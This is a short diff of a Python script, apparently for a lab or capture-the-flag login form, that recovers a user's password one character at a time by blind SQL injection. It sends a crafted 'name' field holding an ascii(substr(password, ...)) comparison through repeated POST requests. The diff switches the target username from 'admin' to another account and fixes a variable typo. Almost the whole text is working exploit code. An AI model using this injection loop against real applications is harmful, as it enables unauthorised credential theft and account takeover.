@@ -11,7 +11,7 @@ words = word.translate(str.maketrans('', '', removeList))
 print(words)
 
 
-userName = "admin"
+userName = "Tlqkf"
 
 
 password = ""
@@ -19,7 +19,7 @@ iscorect = False
 while not iscorect:
     for c in words:
         data = {
-            "name": f"{userNameame}' AND ascii(substr(password, {len(password)} + 1, 1)) = {ord(c)} -- --", 
+            "name": f"{userName}' AND ascii(substr(password, {len(password)} + 1, 1)) = {ord(c)} -- --", 
             "password": f"{password + c}"
         }
         r = requests.post(url, data=data)
